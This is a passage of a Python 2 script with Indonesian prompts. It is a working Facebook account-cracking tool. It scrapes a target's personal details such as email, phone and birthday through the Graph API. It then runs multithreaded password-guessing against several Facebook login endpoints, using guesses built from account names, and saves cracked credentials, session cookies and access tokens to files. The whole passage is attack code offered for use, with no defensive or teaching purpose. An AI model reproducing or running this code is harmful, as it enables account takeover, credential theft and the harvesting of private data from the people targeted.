        os.system('rm -rf ___dekura___sayang___ara___')
        time.sleep(0.01)
        os.sys.exit()
    try:
        checkt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] ID Target: ')
        jemudd = requests.get('https://graph.facebook.com/'+checkt+'?access_token=%s'%(toket))
        kntl = json.loads(jemudd.text)
        fol = requests.get('https://graph.facebook.com/'+checkt+'/subscribers?access_token=%s'%(toket))
        pol = json.loads(fol.text)
        batir = requests.get('https://graph.facebook.com/'+checkt+'/friends?access_token='+toket)
        batirecheck = json.loads(batir.text)
        idne = batirecheck['id']
        id.append(idne)
        nick = kntl['name']
    except KeyError:
        nick = "Tidak Di Temukan  "
    except: pass
    try:
        depan = kntl['frist_name']
    except KeyError:
        depan = "Tidak Di Temukan  "
    except: pass
    try:
        tengah = kntl['middle_name']
    except KeyError:
        tengah = "Tidak Di Temukan  "
    except: pass
    try:
        blngkg = kntl['last_name']
    except KeyError:
        blngkg = "Tidak Di Temukan  "
    except: pass
    try:
        email = kntl['email']
    except KeyError:
        email = "Tidak Di Temukan  "
    except: pass
    try:
        nomor = kntl['phone']
    except KeyError:
        nomor = "Tidak Di Temukan  "
    except: pass
    try:
        sekolah = kntl['school']
    except KeyError:
        sekolah = "Tidak Di Temukan  "
    except: pass
    try:
        jenis = kntl['gender']
    except KeyError:
        jenis = "Tidak Di Temukan  "
    except: pass
    try:
        lokasi = kntl['location']['name']
    except KeyError:
        lokasi = "Tidak Di Temukan  "
    except: pass
    try:
        followers = pol['summary']['total_count']
    except KeyError:
        followers = "Tidak Di Temukan"
    except: pass
    try:
        tinggal = kntl['hometown']['name']
    except KeyError:
        tinggal = "Tidak Di Temukan "
    except: pass
    try:
        ttl = kntl['birthday']
    except KeyError:
        ttl = "Tidak Di Temukan "
    except: pass
#    try:
#        hobi = kntl['profession']
#    except KeyError:
#        hobi = "Tidak Di Temukan "
#    except: pass

    print (" Nick           : %s"%nick)
    #print (" Nama Depan   : %s"%depan)
    #print (" Nama Belakang: %s"%tengah)
    print (" School         : %s"%sekolah)
    print (" Gender         : %s"%jenis)
    print (" Location       : %s"%lokasi)
    print (" Mobile Phone   : %s"%nomor)
    print (" Email          : %s"%email)
    print (" Friendslist    : %s"%(str(len(id))))
    print (" Followers      : %s"%followers)
    print (" HomeTown       : %s"%tinggal)
    print (" Birthday       : %s"%ttl)
    #print (" Hobby          : %s"%hobi)

### Methode Cracknya ###


def dekura_x():
	print '\n\x1b[0;97m [ \x1b[1;36mPilih Metode crack\x1b[1;37m ]'
	print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m1\x1b[1;37m] Crack With Api.Facebook    (%sFast crack%s)'%(o,p)
	print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m2\x1b[1;37m] Crack With Mbasic.Facebook (%sRecommended crack%s)'%(o,p)
	print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] Crack With Touch.Facebook  '
	print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] Crack With M.Facebook      '
	print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m5\x1b[1;37m] Crack With Free.Facebook   '
	print ''
	dekurasayangara = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ")
	if dekurasayangara == "":
		menu()
	elif dekurasayangara == "1":
		bukanmaen = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Crack With Pass Default/Manual [d/m]\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
		if bukanmaen == "m":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345")
				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
				if len(asu) =="":
					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						dekura = [ name, name+"123", name+"12345" ]
					elif len(name)<=2:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat" ]
					coeg.submit(api, uid, dekura)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")

	elif dekurasayangara == "2":
		bukanmaen = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Crack With Pass Default/Manual [d/m]\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
		if bukanmaen == "m":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345")
				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
				if len(asu) =="":
					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mbasic, uid, asu)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=2:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat" ]
					coeg.submit(mbasic, uid, dekura)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")

	elif dekurasayangara == "3":
		bukanmaen = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Crack With Pass Default/Manual [d/m]\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
		if bukanmaen == "m":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345")
				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
				if len(asu) =="":
					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(touch, uid, asu)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=2:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat" ]
					coeg.submit(touch, uid, dekura)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		else:
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!")

	elif dekurasayangara == "4":
		bukanmaen = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Crack With Pass Default/Manual [d/m]\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
		if bukanmaen == "m":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345")
				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
				if len(asu) =="":
					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mfacebook, uid, asu)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=2:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat" ]
					coeg.submit(mfacebook, uid, dekura)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		else:
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!")

	elif dekurasayangara == "5":
		bukanmaen = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Crack With Pass Default/Manual [d/m]\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
		if bukanmaen == "m":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345")
				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
				if len(asu) =="":
					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(freefb, uid, asu)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=2:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					elif len(name)<=3:
						dekura = [ name, name+"123", name+"12345", name+"123456" ]
					else:
						dekura = [ "sayang", "bissmilah", "anjing", "bangsat" ]
					coeg.submit(freefb, uid, dekura)
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing")
		else:
			exit("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!")

	else:
		menu() 

### Api Fast Crack ###


def api(uid, dekura):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s - Ok-:%s - Cp-:%s"%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("___dekura___sayang___ara___", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### Slow Crack ###


def mbasic(uid, dekura):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s - Ok-:%s - Cp-:%s"%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		aracans = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("___dekura___sayang___ara___", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### Slow Crack ###


def touch(uid, dekura):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s - Ok-:%s - Cp-:%s"%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		aracans = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("___dekura___sayang___ara___", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### Slow Crack ###


def mfacebook(uid, dekura):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s - Ok-:%s - Cp-:%s"%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		aracans = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("___dekura___sayang___ara___", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### Slow Crack Kalo Hoki Dapat Ok ###


def freefb(uid, dekura):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s - Ok-:%s - Cp-:%s"%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		p = ses.get("https://free.facebook.com/login/?next&ref=dbl&fl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		aracans = ses.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, kuki))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("___dekura___sayang___ara___", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### Pilih Result ###


def ress():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] RESULT CRACKER")
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Cek Result Crack Friends,Public,Likes,Followers") 
    print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Cek Result Crack Email")
    print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Cek Result Crack Phone Number")
    print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Back To Menu")
    pill = raw_input('\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ')
    if pill =="1" or pill =="01":
        result_mbasicc()
    elif pill =="2" or pill =="02":
        result_emailampas()
    elif pill =="3" or pill =="03":
        result_nomoertogel()
    elif pill =="0" or pill =="00":
        menu()
    else:
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!').format(R, N)
        ress()

### Result __All__ ###


def result_mbasicc():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result M Facebook ###


def result_emefbi():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker M.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat mfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat mfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result Touch Facebook ###


def result_touchh():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Touch.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
